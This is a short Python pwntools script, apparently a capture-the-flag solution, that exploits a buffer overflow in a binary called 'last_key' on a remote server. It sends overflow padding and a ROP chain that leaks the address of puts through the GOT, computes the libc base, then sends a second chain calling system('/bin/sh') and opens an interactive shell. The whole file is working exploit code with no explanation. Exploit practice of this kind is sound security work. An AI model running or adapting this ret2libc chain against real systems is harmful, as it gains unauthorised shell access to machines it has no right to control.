from pwn import *

context.binary = elf = ELF('./last_key')

#pr = process()
pr = remote('94.237.60.18',44986)
# gdb .attach(pr,'''
#            br *set_score+183
#           c
#           ''')
rop1 = ROP(elf)
libc = elf.libc

while True:
    ln = pr.recvuntil(b': ')
    if b'Moves' in ln:
        pr.recvuntil(b': ')
        pr.send(b'r')
    else:
        break

payload = b'A'*25
rop1.call(elf.symbols['puts'],[elf.got['puts']])
rop1.call(elf.symbols['set_score'])
pr.sendline(payload + rop1.chain())
pr.recvline()
pr.recvline()
pr.recvline()
puts_leak = pr.recvline()[:-1]
print(puts_leak)
libc.address = int.from_bytes(puts_leak,'little') - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')
print(ln)

pr.recvuntil(b': ')
rop2 = ROP(libc)
#print(rop2.gadgets)
rop2.call(libc.symbols['system'],[next(libc.search(b'/bin/sh\x00'))])
pr.sendline(payload + p64(elf.symbols['set_score']+183)+rop2.chain())
pr.interactive()
